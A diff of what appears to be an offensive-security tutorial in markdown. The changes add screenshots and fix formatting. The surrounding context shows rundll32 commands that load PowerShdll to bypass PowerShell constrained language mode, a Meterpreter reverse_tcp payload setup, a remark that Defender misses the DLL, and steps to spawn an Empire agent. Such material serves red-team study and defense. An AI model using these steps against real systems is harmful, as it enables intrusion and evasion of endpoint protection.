@@ -38,8 +38,10 @@ Use rundll32 to execute the dll
 `rundll32 .\PowerShdll.dll,main -w`  
 A new interactive powershell prompt should pop up  
 Verify that constrained language mode has been bypassed with  
-$ExecutionContext.SessionState.LanguageMode  
+`$ExecutionContext.SessionState.LanguageMode`  
 It should say FullLanguage
+
+![](/assets/powershdll.png)
 
 #### Getting meterpreter shell
 
@@ -59,8 +61,8 @@ set payload windows/x64/meterpreter/reverse_tcp
 exploit
 ```
 
-Download the msf.dll using the IE "save as" trick from before.
-![](/assets/dll.png)  
+Download the msf.dll using the IE "save as" trick from before.  
+![](/assets/dll.png)
 
 For some reason I am not sure why the dll payload is not eaten by Windows Defender, not on disk and not when executed. It could possibly be the x64 signature of the payload is not yet recgonized as malware by Defender.
 
@@ -69,6 +71,8 @@ Now, use rundll32 to execute the dll. We use this because rundll32 is a binary t
 `rundll32 .\PowerShdll.dll,Control_RunDLL`
 
 Shell should now spawn in msf.
+
+![](/assets/msfshell.png)
 
 #### Empire without powershell.exe
 
@@ -93,7 +97,8 @@ load powershell
 powershell_shell
 ```
 
-Copypaste the empire listener in the interactive shell, and an agent should spawn in Empire. Congratulations!
+Copypaste the empire listener in the interactive shell, and an agent should spawn in Empire. Congratulations!  
+![](/assets/empireagent.png)
 
 ## More advanced technique
 
